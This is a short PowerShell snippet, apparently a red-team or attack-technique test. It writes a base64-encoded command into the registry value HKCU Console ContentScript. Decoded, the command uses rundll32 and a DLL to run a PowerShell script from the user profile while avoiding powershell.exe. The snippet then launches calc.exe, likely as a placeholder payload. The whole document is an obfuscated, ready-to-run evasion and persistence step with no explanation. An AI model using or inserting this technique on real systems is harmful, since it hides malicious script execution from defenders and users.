$code = "cgB1AG4AZABsAGwAMwAyACAAJQB1AHMAZQByAHAAcgBvAGYAaQBsAGUAJQBcAHAAbwB3AGUAcgBzAGgAZABsAGwALgBkAGwAbAAsACAAbQBhAGkAbgAgAC0AZgAgACUAdQBzAGUAcgBwAHIAbwBmAGkAbABlACUAXAB0AGUAcwB0AC4AcABzADEA"
Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;
Start-Process 'C:\windows\system32\calc.exe'
